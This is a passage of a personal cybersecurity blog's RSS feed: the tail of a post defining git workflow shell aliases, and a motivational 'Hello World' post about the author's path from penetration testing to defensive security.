&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;alias&lt;/span&gt; gitflow-deploy&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;./.shell/github-deploy&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;alias&lt;/span&gt; gitflow-clean&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;./.shell/github-merged.sh&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Then simply run:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;gitflow-branch
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;gitflow-deploy
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;gitflow-clean&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;meting-js auto="https://music.163.com/#/album?id=268399691" theme="#448aff" fixed="true"&gt;&lt;/meting-js&gt;
&lt;!--
![Снег падает без конца, покрывая души, как невидимый саван. Каждый снежинка — это забытое воспоминание, утерянный звук в безбрежной тишине. Здесь, в самом сердце зимы, когда ветер воет как зверь, человек идет, не зная точно, куда](images/coffee.jpg 'Человек продолжает идти, без цели, без вопросов, ведомый странной уверенностью, что всё уже написано, но всё равно он должен искать, снова и снова')
--&gt;</description></item><item><title>Hello World</title><link>https://Pr0xyG33k.github.io/posts/hello-world/</link><pubDate>Sat, 10 May 2025 02:47:00 +0200</pubDate><author>1024@Pr0xyG33k.github.io (ProxyGeek)</author><guid>https://Pr0xyG33k.github.io/posts/hello-world/</guid><category domain="https://Pr0xyG33k.github.io/categories/thoughts/">Thoughts</category><description>&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;What wakes you up every morning is not the alarm clock, but your dreams.&amp;rdquo;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;I’ve lived through moments where this belief kept me going. I’ve seen the effort I’ve put into my work, and now, as I look back, the real question isn’t whether I’ve earned what I have — it’s about continuing to push forward, unflinching in the face of challenges.&lt;/p&gt;
&lt;p&gt;In cybersecurity, the fight is never over. It’s a world where the enemy never sleeps, and neither should we.&lt;/p&gt;
&lt;p&gt;From my early days in tech, grappling with complex algorithms and shifting to cybersecurity, the road has been long. I started with basic coding, moved to penetration testing, then switched to defensive security, teaching interns, and tackling real-world security problems. Every step has been driven by &lt;strong&gt;curiosity&lt;/strong&gt; and the desire to &lt;strong&gt;defend&lt;/strong&gt; what matters — our digital lives.&lt;/p&gt;
&lt;p&gt;Time doesn’t pause because we hesitate. Like you, there are countless others chasing their dreams. No one is born a cybersecurity expert, but each day is an opportunity to grow, to protect, and to evolve. Never be content with where you are; always strive to learn, to adapt, and to secure.&lt;/p&gt;
&lt;p&gt;I started this blog to share my journey — from early security challenges to tips on staying safe online. In the early days, I followed the guidance of mentors, learned from books, and coded through the night. The name &amp;ldquo;Securing the Digital World&amp;rdquo; was born from the countless hours spent defending what many people overlook: the safety of our digital lives.&lt;/p&gt;
&lt;p&gt;Here’s to the next chapter of cybersecurity, as we continue to evolve in a world where data is power, and protection is key.&lt;/p&gt;
&lt;meting-js auto="https://music.163.com/#/album?id=268399691" theme="#448aff" fixed="true"&gt;&lt;/meting-js&gt;
&lt;!--
![Снег падает без конца, покрывая души, как невидимый саван. Каждый снежинка — это забытое воспоминание, утерянный звук в безбрежной тишине. Здесь, в самом сердце зимы, когда ветер воет как зверь, человек идет, не зная точно, куда](images/coffee.jpg 'Человек продолжает идти, без цели, без вопросов, ведомый странной уверенностью, что всё уже написано, но всё равно он должен искать, снова и снова')
--&gt;</description></item></channel></rss>